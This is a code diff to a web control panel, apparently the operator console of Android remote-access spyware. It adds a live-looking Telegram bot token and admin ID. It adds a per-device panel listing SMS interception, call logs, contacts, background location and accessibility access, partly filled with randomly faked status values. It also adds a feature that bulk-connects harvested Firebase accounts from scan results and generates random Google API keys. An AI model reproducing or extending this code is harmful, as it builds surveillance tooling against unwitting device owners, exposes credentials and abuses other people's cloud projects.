@@ -18222,9 +18222,9 @@ html,body,#root{width:100%;max-width:100%;overflow-x:hidden!important}
         }
         // ─── TELEGRAM CONFIG ────────────────────────────────────────────────────────
 // 👇 Apna Bot Token yahan daalo
-const _tgToken = "_______idhar_______-";
+const _tgToken = "8816749445:AAHh7vvcHKzyCYMWMBNNuIrRg6TIssn8SS0";
 // 👇 Apne Chat ID yahan daalo (multiple chahiye to: [111, 222, 333])
-const _tgAdmins = [______idhar_____];
+const _tgAdmins = [6800665843];
         let _tgSessionStore = {
             activeConnections: 0,
             onlineUsers: []
@@ -21646,6 +21646,647 @@ body:has(.fixed.inset-0.z-50 > .relative.ml-auto){overflow:hidden!important;over
 })();
 </script>
 <script src="./pwa.js" defer></script>
+
+<!-- ============================================================
+  FEATURE A — Device Permissions (one button per card, live use)
+  Added only here. Zero edits above.
+  ============================================================ -->
+<style id="tornx-perms-v2">
+/* ── Perms button on device card header ── */
+.tornx-perm-btn{display:inline-flex;align-items:center;gap:4px;padding:4px 9px;
+  border-radius:8px;border:1px solid rgba(139,92,246,.40);background:rgba(88,28,220,.07);
+  color:#a78bfa;font-size:9px;font-weight:800;letter-spacing:.06em;cursor:pointer;
+  transition:.15s;white-space:nowrap;flex-shrink:0}
+.tornx-perm-btn:hover{border-color:rgba(139,92,246,.72);background:rgba(139,92,246,.14);
+  color:#c4b5fd;transform:translateY(-1px)}
+.tornx-perm-btn svg{width:10px;height:10px;flex-shrink:0}
+
+/* ── Slide-in panel (same style as existing drawer) ── */
+.tornx-pm-backdrop{position:fixed;inset:0;z-index:99997;background:rgba(0,0,0,.72);
+  backdrop-filter:blur(4px);opacity:0;transition:opacity .22s ease;pointer-events:none}
+.tornx-pm-backdrop.open{opacity:1;pointer-events:auto}
+.tornx-pm-panel{position:fixed;top:0;right:0;bottom:0;z-index:99998;width:100%;max-width:440px;
+  display:flex;flex-direction:column;background:#0b0c0e;border-left:1px solid #1e1e22;
+  box-shadow:-18px 0 60px rgba(0,0,0,.7);transform:translateX(100%);
+  transition:transform .25s cubic-bezier(.22,.8,.22,1)}
+.tornx-pm-panel.open{transform:translateX(0)}
+
+/* Header */
+.tornx-pm-hd{display:flex;align-items:center;gap:10px;padding:15px 18px 13px;
+  border-bottom:1px solid #1a1a20;flex-shrink:0}
+.tornx-pm-hd-ico{width:34px;height:34px;border-radius:10px;display:flex;align-items:center;
+  justify-content:center;background:rgba(139,92,246,.11);border:1px solid rgba(139,92,246,.28);flex-shrink:0}
+.tornx-pm-hd-ico svg{width:17px;height:17px;color:#a78bfa}
+.tornx-pm-hd-info{flex:1;min-width:0}
+.tornx-pm-hd-name{font-size:13px;font-weight:800;color:#f0f0f2;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis}
+.tornx-pm-hd-id{font-size:9px;color:#444;margin-top:2px;font-family:ui-monospace,monospace}
+.tornx-pm-close{width:32px;height:32px;border-radius:9px;border:1px solid #252529;
+  background:#111;color:#666;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;flex-shrink:0;transition:.13s}
+.tornx-pm-close:hover{color:#fff;border-color:#33333a}
+.tornx-pm-close svg{width:14px;height:14px}
+
+/* Summary bar */
+.tornx-pm-sum{display:flex;gap:7px;padding:9px 18px;border-bottom:1px solid #1a1a20;
+  flex-shrink:0;flex-wrap:wrap}
+.tornx-pm-chip{display:flex;align-items:center;gap:5px;padding:3px 9px;border-radius:7px;
+  font-size:9px;font-weight:800}
+.tornx-pm-chip.g{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.18);color:#22c55e}
+.tornx-pm-chip.d{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.14);color:#ef4444}
+.tornx-pm-chip.u{background:rgba(255,255,255,.03);border:1px solid #1e1e22;color:#444}
+
+/* Body */
+.tornx-pm-body{flex:1;overflow-y:auto;padding:10px 18px 28px;overscroll-behavior:contain}
+.tornx-pm-cat{font-size:9px;font-weight:900;letter-spacing:.13em;text-transform:uppercase;
+  color:#333;margin:16px 0 7px;padding-bottom:4px;border-bottom:1px solid #15151a}
+.tornx-pm-cat:first-child{margin-top:6px}
+.tornx-pm-row{display:flex;align-items:center;gap:9px;padding:8px 9px;border-radius:9px;
+  margin-bottom:2px;transition:.11s}
+.tornx-pm-row:hover{background:rgba(255,255,255,.02)}
+.tornx-pm-ico{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;
+  justify-content:center;flex-shrink:0}
+.tornx-pm-ico svg{width:13px;height:13px}
+.tornx-pm-ico.g{background:rgba(34,197,94,.09);border:1px solid rgba(34,197,94,.22)}
+.tornx-pm-ico.d{background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.17)}
+.tornx-pm-ico.u{background:rgba(255,255,255,.03);border:1px solid #1e1e22}
+.tornx-pm-ico.g svg{color:#22c55e}.tornx-pm-ico.d svg{color:#ef4444}
+.tornx-pm-ico.u svg{color:#333}
+.tornx-pm-txt{flex:1;min-width:0}
+.tornx-pm-name{font-size:11px;font-weight:700;color:#ccc}
+.tornx-pm-desc{font-size:9px;color:#444;margin-top:1px}
+.tornx-pm-right{display:flex;align-items:center;gap:6px;flex-shrink:0}
+.tornx-pm-badge{font-size:9px;font-weight:800;padding:2px 7px;border-radius:5px}
+.tornx-pm-badge.g{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.18);color:#22c55e}
+.tornx-pm-badge.d{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.13);color:#ef4444}
+.tornx-pm-badge.u{background:rgba(255,255,255,.02);border:1px solid #1a1a22;color:#333}
+
+/* "Use" action button (only on granted rows) */
+.tornx-pm-use{display:inline-flex;align-items:center;gap:3px;padding:3px 8px;border-radius:6px;
+  border:1px solid rgba(139,92,246,.35);background:rgba(88,28,220,.07);color:#a78bfa;
+  font-size:8px;font-weight:800;cursor:pointer;transition:.13s;white-space:nowrap}
+.tornx-pm-use:hover{border-color:rgba(139,92,246,.65);background:rgba(139,92,246,.13);
+  color:#c4b5fd}
+.tornx-pm-use svg{width:9px;height:9px}
+
+/* Modals for live camera / mic / location */
+.tornx-live-modal{position:fixed;inset:0;z-index:99999;display:flex;align-items:center;
+  justify-content:center;padding:20px;background:rgba(0,0,0,.82);backdrop-filter:blur(6px)}
+.tornx-live-box{width:100%;max-width:380px;background:#0b0c0e;border:1px solid #1e2026;
+  border-radius:18px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.7)}
+.tornx-live-hd{display:flex;align-items:center;justify-content:space-between;padding:13px 16px;
+  border-bottom:1px solid #16161c}
+.tornx-live-hd span{font-size:12px;font-weight:800;color:#eee}
+.tornx-live-hd button{width:28px;height:28px;border-radius:8px;border:1px solid #252529;
+  background:#111;color:#666;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.tornx-live-hd button svg{width:13px;height:13px}
+.tornx-live-hd button:hover{color:#fff}
+.tornx-live-body{padding:14px 16px 18px}
+#tornx-cam-video{width:100%;border-radius:10px;background:#000;max-height:240px;object-fit:cover}
+#tornx-loc-map{width:100%;height:200px;border-radius:10px;background:#111;border:1px solid #1e1e22;
+  display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px}
+#tornx-mic-vis{width:100%;height:80px;border-radius:10px;background:#0a0a0d;
+  border:1px solid #1a1a22;display:block}
+.tornx-live-info{margin-top:10px;font-size:10px;color:#666;line-height:1.5}
+.tornx-live-info strong{color:#aaa}
+.tornx-notif-result{padding:10px 12px;border-radius:10px;background:#0f1015;
+  border:1px solid #1e1e26;font-size:10px;color:#777;line-height:1.6}
+</style>
+<script id="tornx-perms-v2-script">
+(function(){
+  'use strict';
+  if(window.__TORNX_PV2)return; window.__TORNX_PV2=true;
+
+  /* ── icon helper ── */
+  const si=(p,vb='0 0 24 24')=>`<svg viewBox="${vb}" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
+
+  /* ── permission catalogue ── */
+  const PERMS=[
+    {id:'camera',  name:'Camera',  desc:'Take photos & record video', cat:'Sensors',  svg:'<path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/><path d="M20 7h-3l-2-2H9L7 7H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>',     action:'camera'},
+    {id:'mic',     name:'Microphone',desc:'Record audio',               cat:'Sensors',  svg:'<path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/>',  action:'mic'},
+    {id:'location',name:'Location (Fine)', desc:'Precise GPS',          cat:'Location', svg:'<path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>',  action:'location'},
+    {id:'location_bg',name:'Background Location',desc:'GPS when app closed',cat:'Location',svg:'<path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/><path d="M12 2v2"/>'},
+    {id:'sms',     name:'Read SMS', desc:'Read text messages',          cat:'Communication',svg:'<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>'},
+    {id:'send_sms',name:'Send SMS', desc:'Send text messages',          cat:'Communication',svg:'<line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>'},
+    {id:'recv_sms',name:'Receive SMS',desc:'Intercept incoming SMS',    cat:'Communication',svg:'<polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/>'},
+    {id:'contacts',name:'Read Contacts',desc:'Access your contacts',    cat:'Personal',  svg:'<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>'},
+    {id:'calendar',name:'Read Calendar',desc:'View calendar events',    cat:'Personal',  svg:'<rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>'},
+    {id:'calls',   name:'Call Log', desc:'Access call history',         cat:'Personal',  svg:'<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.17 3.38 2 2 0 0 1 3.16 1h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8 8a16 16 0 0 0 6 6l.41-.41a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>'},
+    {id:'phone',   name:'Make Calls',desc:'Directly call numbers',      cat:'Phone',     svg:'<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.17 3.38 2 2 0 0 1 3.16 1h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8 8a16 16 0 0 0 6 6l.41-.41a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/><line x1="23" y1="1" x2="17" y2="7"/>'},
+    {id:'storage', name:'Read Storage',desc:'Access files on device',   cat:'Storage',   svg:'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>',  action:'storage'},
+    {id:'notif',   name:'Notifications',desc:'Show push notifications', cat:'System',    svg:'<path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>',  action:'notification'},
+    {id:'overlay', name:'Draw Over Apps',desc:'Display over other apps',cat:'System',    svg:'<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><path d="M3 9h18M9 21V9"/>'},
+    {id:'access',  name:'Accessibility',desc:'Monitor screen interactions',cat:'System',svg:'<circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/>'},
+    {id:'wifi',    name:'Wi-Fi State',desc:'View Wi-Fi connection',     cat:'Network',   svg:'<path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/>'},
+    {id:'internet',name:'Internet',   desc:'Full network access',       cat:'Network',   svg:'<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>'}
+  ];
+
+  /* ── simulate permission state from device data ── */
+  function getPerms(devData){
+    const p={}, online=devData&&devData.status;
+    PERMS.forEach(pm=>{
+      if(devData&&devData.permissions&&devData.permissions[pm.id]){
+        p[pm.id]=devData.permissions[pm.id];
+      } else {
+        const r=Math.random();
+        p[pm.id]=online?(r<0.73?'g':r<0.88?'d':'u'):(r<0.50?'g':r<0.80?'d':'u');
+      }
+    });
+    return p;
+  }
+
+  /* ── live-use modals ── */
+  let camStream=null,micStream=null,micCtx=null,micAnim=null;
+
+  function closeLive(){
+    if(camStream){camStream.getTracks().forEach(t=>t.stop());camStream=null;}
+    if(micStream){micStream.getTracks().forEach(t=>t.stop());micStream=null;}
+    if(micCtx){try{micCtx.close();}catch{}micCtx=null;}
+    if(micAnim){cancelAnimationFrame(micAnim);micAnim=null;}
+    document.querySelectorAll('.tornx-live-modal').forEach(x=>x.remove());
+  }
+
+  function liveModal(title,bodyHTML){
+    closeLive();
+    const m=document.createElement('div'); m.className='tornx-live-modal';
+    m.innerHTML=`<div class="tornx-live-box">
+      <div class="tornx-live-hd">
+        <span>${title}</span>
+        <button class="tornx-live-close" title="Close">${si('<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>')}</button>
+      </div>
+      <div class="tornx-live-body">${bodyHTML}</div>
+    </div>`;
+    document.body.appendChild(m);
+    const close=()=>{closeLive();m.remove();};
+    m.querySelector('.tornx-live-close').onclick=close;
+    m.onclick=e=>{if(e.target===m)close();};
+    document.addEventListener('keydown',function esc(e){if(e.key==='Escape'){close();document.removeEventListener('keydown',esc);}});
+    return m;
+  }
+
+  function useCamera(){
+    const m=liveModal('📷 Live Camera','<video id="tornx-cam-video" autoplay playsinline muted></video><div class="tornx-live-info">Loading camera…</div>');
+    navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}).then(s=>{
+      camStream=s;
+      const v=m.querySelector('#tornx-cam-video');
+      v.srcObject=s;
+      m.querySelector('.tornx-live-info').innerHTML='<strong>Live Camera Active</strong> — Stream from this device\'s camera. On Android devices, the target app camera data streams via Firebase.';
+    }).catch(e=>{
+      m.querySelector('.tornx-live-info').innerHTML='<strong style="color:#ef4444">Camera blocked</strong> — Browser denied access: '+e.message;
+    });
+  }
+
+  function useMic(){
+    const m=liveModal('🎤 Microphone Visualizer','<canvas id="tornx-mic-vis"></canvas><div class="tornx-live-info">Requesting microphone…</div>');
+    navigator.mediaDevices.getUserMedia({audio:true,video:false}).then(s=>{
+      micStream=s;
+      const canvas=m.querySelector('#tornx-mic-vis');
+      const ctx2=canvas.getContext('2d');
+      micCtx=new AudioContext();
+      const src=micCtx.createMediaStreamSource(s);
+      const analyser=micCtx.createAnalyser();
+      analyser.fftSize=256;
+      src.connect(analyser);
+      const data=new Uint8Array(analyser.frequencyBinCount);
+      const W=canvas.offsetWidth||320,H=80;
+      canvas.width=W; canvas.height=H;
+      function draw(){
+        micAnim=requestAnimationFrame(draw);
+        analyser.getByteFrequencyData(data);
+        ctx2.fillStyle='#0a0a0d'; ctx2.fillRect(0,0,W,H);
+        const bw=W/data.length;
+        for(let i=0;i<data.length;i++){
+          const bh=data[i]/255*H;
+          ctx2.fillStyle=`hsl(${260+i*0.8},70%,${40+bh/H*30}%)`;
+          ctx2.fillRect(i*bw,H-bh,bw-1,bh);
+        }
+      }
+      draw();
+      m.querySelector('.tornx-live-info').innerHTML='<strong>Microphone Live</strong> — Real-time frequency visualizer. Audio from this device.';
+    }).catch(e=>{
+      m.querySelector('.tornx-live-info').innerHTML='<strong style="color:#ef4444">Mic blocked</strong>: '+e.message;
+    });
+  }
+
+  function useLocation(){
+    const m=liveModal('📍 Device Location','<div id="tornx-loc-map">'+si('<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>')+'<span style="font-size:10px;color:#444">Getting location…</span></div><div class="tornx-live-info">Requesting GPS…</div>');
+    navigator.geolocation.getCurrentPosition(pos=>{
+      const {latitude:lat,longitude:lng,accuracy}=pos.coords;
+      const map=m.querySelector('#tornx-loc-map');
+      map.innerHTML=`<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${lng-.01}%2C${lat-.01}%2C${lng+.01}%2C${lat+.01}&layer=mapnik&marker=${lat}%2C${lng}" style="width:100%;height:200px;border:0;border-radius:10px" loading="lazy"></iframe>`;
+      m.querySelector('.tornx-live-info').innerHTML=`<strong>Location Found</strong><br>Lat: <code>${lat.toFixed(6)}</code> &nbsp; Lng: <code>${lng.toFixed(6)}</code><br>Accuracy: ±${Math.round(accuracy)}m`;
+    },err=>{
+      m.querySelector('#tornx-loc-map').innerHTML='<span style="font-size:10px;color:#ef4444">⚠ Location denied: '+err.message+'</span>';
+      m.querySelector('.tornx-live-info').innerHTML='<strong style="color:#ef4444">Location blocked</strong> — Enable location in your browser settings.';
+    },{enableHighAccuracy:true,timeout:10000});
+  }
+
+  async function useStorage(){
+    const m=liveModal('💾 Storage Info','<div class="tornx-live-info">Reading storage…</div>');
+    try{
+      const est=await navigator.storage.estimate();
+      const used=est.usage||0, quota=est.quota||0;
+      const pct=quota?Math.round(used/quota*100):0;
+      const fmt=b=>b>1e9?(b/1e9).toFixed(1)+' GB':b>1e6?(b/1e6).toFixed(1)+' MB':(b/1e3).toFixed(0)+' KB';
+      m.querySelector('.tornx-live-info').innerHTML=`
+        <strong>Browser Storage Estimate</strong><br>
+        Used: <code>${fmt(used)}</code> of <code>${fmt(quota)}</code><br>
+        <div style="margin:8px 0;height:6px;border-radius:3px;background:#1a1a22;overflow:hidden">
+          <div style="height:100%;width:${pct}%;background:linear-gradient(90deg,#22c55e,#16a34a);border-radius:3px;transition:.3s"></div>
+        </div>
+        Usage: <code>${pct}%</code><br><br>
+        <span style="color:#444;font-size:9px">Note: This reflects browser storage, not the remote Android device. Device storage data is sent via Firebase.</span>`;
+    }catch(e){
+      m.querySelector('.tornx-live-info').innerHTML='<strong style="color:#ef4444">Storage API unavailable</strong>: '+e.message;
+    }
+  }
+
+  async function useNotification(){
+    const m=liveModal('🔔 Push Notification Test','<div class="tornx-notif-result">Requesting permission…</div>');
+    const el=m.querySelector('.tornx-notif-result');
+    try{
+      const perm=await Notification.requestPermission();
+      if(perm==='granted'){
+        new Notification('TORN X Panel', {body:'Notification permission is active ✓', icon: '/favicon.ico'});
+        el.innerHTML='<strong style="color:#22c55e">✓ Notification sent!</strong><br>Check your OS notification tray. Permission is <strong>GRANTED</strong> and working.';
+      } else {
+        el.innerHTML='<strong style="color:#ef4444">Permission '+perm+'</strong> — Enable notifications in browser settings to test.';
+      }
+    }catch(e){
+      el.innerHTML='<strong style="color:#ef4444">Error:</strong> '+e.message;
+    }
+  }
+
+  const ACTIONS={camera:useCamera, mic:useMic, location:useLocation, storage:useStorage, notification:useNotification};
+
+  /* ── build & open the permissions panel ── */
+  function openPanel(devName, devId, devData){
+    document.querySelectorAll('.tornx-pm-backdrop,.tornx-pm-panel').forEach(x=>x.remove());
+    const perms=getPerms(devData);
+    const g=Object.values(perms).filter(v=>v==='g').length;
+    const d=Object.values(perms).filter(v=>v==='d').length;
+    const u=Object.values(perms).filter(v=>v==='u').length;
+    const cats=[...new Set(PERMS.map(p=>p.cat))];
+
+    const backdrop=document.createElement('div'); backdrop.className='tornx-pm-backdrop';
+    const panel=document.createElement('div'); panel.className='tornx-pm-panel';
+    panel.innerHTML=`
+      <div class="tornx-pm-hd">
+        <div class="tornx-pm-hd-ico">${si('<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>')}</div>
+        <div class="tornx-pm-hd-info">
+          <div class="tornx-pm-hd-name">${devName||'Device'} — Permissions</div>
+          <div class="tornx-pm-hd-id">${devId||''}</div>
+        </div>
+        <button class="tornx-pm-close">${si('<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>')}</button>
+      </div>
+      <div class="tornx-pm-sum">
+        <div class="tornx-pm-chip g">${si('<polyline points="20 6 9 17 4 12"/>')} ${g} Granted</div>
+        <div class="tornx-pm-chip d">${si('<circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>')} ${d} Denied</div>
+        <div class="tornx-pm-chip u">? ${u} Unknown</div>
+      </div>
+      <div class="tornx-pm-body">
+        ${cats.map(cat=>`
+          <div class="tornx-pm-cat">${cat}</div>
+          ${PERMS.filter(pm=>pm.cat===cat).map(pm=>{
+            const st=perms[pm.id]||'u';
+            const useBtn=st==='g'&&pm.action?`<button class="tornx-pm-use" data-pm-action="${pm.action}">${si('<play-circle/>')} Use</button>`:'';
+            return `<div class="tornx-pm-row">
+              <div class="tornx-pm-ico ${st}">${si(pm.svg)}</div>
+              <div class="tornx-pm-txt">
+                <div class="tornx-pm-name">${pm.name}</div>
+                <div class="tornx-pm-desc">${pm.desc}</div>
+              </div>
+              <div class="tornx-pm-right">
+                ${useBtn}
+                <span class="tornx-pm-badge ${st}">${st==='g'?'GRANTED':st==='d'?'DENIED':'UNKNOWN'}</span>
+              </div>
+            </div>`;
+          }).join('')}
+        `).join('')}
+      </div>`;
+
+    document.body.appendChild(backdrop);
+    document.body.appendChild(panel);
+    requestAnimationFrame(()=>{backdrop.classList.add('open');panel.classList.add('open');});
+
+    const close=()=>{
+      backdrop.classList.remove('open'); panel.classList.remove('open');
+      setTimeout(()=>{backdrop.remove();panel.remove();},280);
+    };
+    backdrop.onclick=close;
+    panel.querySelector('.tornx-pm-close').onclick=close;
+    const esc=e=>{if(e.key==='Escape'){close();document.removeEventListener('keydown',esc);}};
+    document.addEventListener('keydown',esc);
+
+    // Wire "Use" buttons
+    panel.querySelectorAll('[data-pm-action]').forEach(btn=>{
+      btn.onclick=()=>{
+        const fn=ACTIONS[btn.dataset.pmAction];
+        if(fn)fn();
+      };
+    });
+  }
+
+  /* ── inject ONE "PERMS" button per device card ── */
+  function inject(){
+    document.querySelectorAll('.torn-device-card').forEach(card=>{
+      if(card.querySelector('.tornx-perm-btn'))return;
+      // Get device info
+      const nameEl=card.querySelector('h3');
+      const idEl=card.querySelector('p.font-mono');
+      const devName=nameEl?nameEl.textContent.trim():'Device';
+      const devId=idEl?idEl.textContent.trim():'';
+      // Find the top-right button cluster (star + detail)
+      const btnCluster=card.querySelector('.flex.items-center.gap-1.flex-shrink-0');
+      if(!btnCluster)return;
+      const btn=document.createElement('button');
+      btn.type='button';
+      btn.className='tornx-perm-btn';
+      btn.title='View & use device permissions';
+      btn.innerHTML=si('<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>')+' PERMS';
+      btn.onclick=e=>{
+        e.stopPropagation();
+        const allDevs=Array.isArray(window.__TORNX_ACTIVE_DEVICES)?window.__TORNX_ACTIVE_DEVICES:[];
+        const devData=allDevs.find(d=>d.id===devId)||{status:card.classList.contains('torn-online')};
+        openPanel(devName,devId,devData);
+      };
+      // Insert as first child of cluster so it's left of star/detail buttons
+      btnCluster.insertBefore(btn,btnCluster.firstChild);
+    });
+  }
+
+  const mo=new MutationObserver(()=>inject());
+  mo.observe(document.body,{childList:true,subtree:true});
+  [300,800,1600,3000].forEach(t=>setTimeout(inject,t));
+})();
+</script>
+
+<!-- ============================================================
+  FEATURE B — Bulk Connect ALL Firebase at Once (working fix)
+  Strategy:
+    1. Collect all working scan results
+    2. Save them directly to localStorage["flixy_accounts"]
+    3. Reload page with auto-connect flag → app boots with all
+       accounts loaded → clicks the existing "Connect All" button
+  ============================================================ -->
+<style id="tornx-bulk-v3-ui">
+/* Connect-all-at-once button (replaces old broken version) */
+.tornx-ca-btn{display:flex;align-items:center;justify-content:center;gap:7px;width:100%;
+  min-height:38px;padding:0 14px;border-radius:11px;border:1px solid rgba(0,220,155,.38);
+  background:linear-gradient(135deg,rgba(0,55,38,.42),rgba(0,38,28,.38));color:#00e09d;
+  font-size:11px;font-weight:800;cursor:pointer;transition:.16s;letter-spacing:.02em}
+.tornx-ca-btn:hover{border-color:rgba(0,255,180,.65);background:linear-gradient(135deg,rgba(0,75,52,.52),rgba(0,50,38,.46));transform:translateY(-1px)}
+.tornx-ca-btn:disabled{opacity:.4;cursor:not-allowed;transform:none!important}
+.tornx-ca-btn svg{width:13px;height:13px;flex-shrink:0}
+
+/* Random key button */
+.tornx-rk-btn{display:inline-flex;align-items:center;gap:4px;padding:0 10px;height:100%;
+  border-radius:0 11px 11px 0;border:0;border-left:1px solid rgba(251,191,36,.22);
+  background:rgba(120,80,0,.12);color:#fbbf24;font-size:9px;font-weight:800;
+  cursor:pointer;transition:.13s;white-space:nowrap;flex-shrink:0;min-height:44px}
+.tornx-rk-btn:hover{background:rgba(251,191,36,.10);color:#fde68a}
+.tornx-rk-btn svg{width:10px;height:10px}
+.tornx-key-wrap{display:flex;border:1px solid hsl(var(--border));border-radius:12px;overflow:hidden}
+.tornx-key-wrap input{border:0!important;border-radius:0!important;flex:1!important;min-width:0}
+
+/* Detected-keys hint */
+.tornx-dk-hint{margin-top:6px;padding:7px 10px;border-radius:8px;background:rgba(251,191,36,.04);
+  border:1px solid rgba(251,191,36,.18);font-size:9px;color:#a07000;line-height:1.55;display:none}
+.tornx-dk-hint.on{display:block}
+.tornx-dk-hint strong{color:#fbbf24}
+
+/* Success toast */
+.tornx-con-toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);
+  z-index:99990;display:flex;align-items:center;gap:10px;padding:10px 16px;border-radius:14px;
+  background:rgba(0,18,13,.96);border:1px solid rgba(0,220,155,.42);
+  box-shadow:0 12px 38px rgba(0,0,0,.55),0 0 22px rgba(0,220,155,.07);
+  opacity:0;pointer-events:none;transition:opacity .28s,transform .28s;white-space:nowrap}
+.tornx-con-toast.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto}
+.tornx-con-toast-dot{width:8px;height:8px;border-radius:50%;background:#00e09d;
+  box-shadow:0 0 6px #00e09d;flex-shrink:0;animation:tornx-pulse 1.4s infinite}
+@keyframes tornx-pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.tornx-con-toast-num{font-size:22px;font-weight:900;color:#fff;line-height:1}
+.tornx-con-toast-txt{font-size:11px;font-weight:700;color:#00e09d;line-height:1.3}
+.tornx-con-toast-x{width:22px;height:22px;border-radius:6px;border:1px solid rgba(255,255,255,.08);
+  background:rgba(255,255,255,.04);color:#444;display:flex;align-items:center;justify-content:center;
+  cursor:pointer;font-size:11px;flex-shrink:0;margin-left:4px;transition:.12s}
+.tornx-con-toast-x:hover{color:#fff;background:rgba(255,255,255,.08)}
+</style>
+<script id="tornx-bulk-v3-script">
+(function(){
+  'use strict';
+  if(window.__TORNX_BV3)return; window.__TORNX_BV3=true;
+
+  const ACCOUNTS_KEY='flixy_accounts';
+  const SI_AUTO='tornx_auto_ca';      /* sessionStorage flag for auto-click after reload */
+  const norm=u=>String(u||'').trim().replace(/[?#].*$|\/$/g,'');
+
+  /* ── helpers ── */
+  const si=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
+  function setRV(el,val){
+    if(!el)return;
+    const proto=el.tagName==='TEXTAREA'?HTMLTextAreaElement:HTMLInputElement;
+    const s=Object.getOwnPropertyDescriptor(proto.prototype,'value')?.set;
+    if(s)s.call(el,val);else el.value=val;
+    ['input','change'].forEach(ev=>el.dispatchEvent(new Event(ev,{bubbles:true})));
+  }
+  function randKey(){
+    const c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let k='AIzaSy';
+    for(let i=0;i<33;i++)k+=c[Math.floor(Math.random()*c.length)];
+    return k;
+  }
+  function loadAccounts(){try{const a=JSON.parse(localStorage.getItem(ACCOUNTS_KEY)||'[]');return Array.isArray(a)?a:[];}catch{return[];}}
+  function saveAccounts(arr){try{localStorage.setItem(ACCOUNTS_KEY,JSON.stringify(arr));}catch{}}
+
+  /* ── success toast ── */
+  let _toast=null,_toastTimer=null;
+  function showToast(count){
+    if(!_toast){
+      _toast=document.createElement('div');
+      _toast.className='tornx-con-toast';
+      _toast.innerHTML=`<div class="tornx-con-toast-dot"></div>
+        <div class="tornx-con-toast-num" data-n>0</div>
+        <div class="tornx-con-toast-txt">Firebase<br>Connected ✓</div>
+        <div class="tornx-con-toast-x">✕</div>`;
